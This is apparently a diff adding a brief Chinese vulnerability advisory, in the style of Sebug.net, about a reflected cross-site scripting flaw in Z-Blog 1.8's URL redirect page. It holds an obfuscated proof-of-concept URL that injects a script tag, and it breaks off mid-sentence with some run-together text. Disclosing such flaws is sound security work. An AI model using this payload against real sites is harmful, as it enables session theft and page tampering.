@@ -1,0 +1,6 @@
+Z-blog跨站脚本攻击漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.精心构造url参数将能构造一个url类型的非持久xss如下：2. 3.http://127.0.0.1/Z-Blog18/FUNCTION/c_urlredirect.asp?url=jxaxvxaxsxcxrxixpxtx%3Ax%22x%3Ex%3Cxsxcxrxixpxtx+xsxrxcx%3Dxhxtxtxpx%3Ax%2Fx%2Fx1×2×7x%2Ex0x%2Ex0x%2Ex1x%2Fx1x%2Exjxsx%3Ex%3Cx%2Fxsxcxrxixpxtx%3Ex4. 5.上述url访问之后
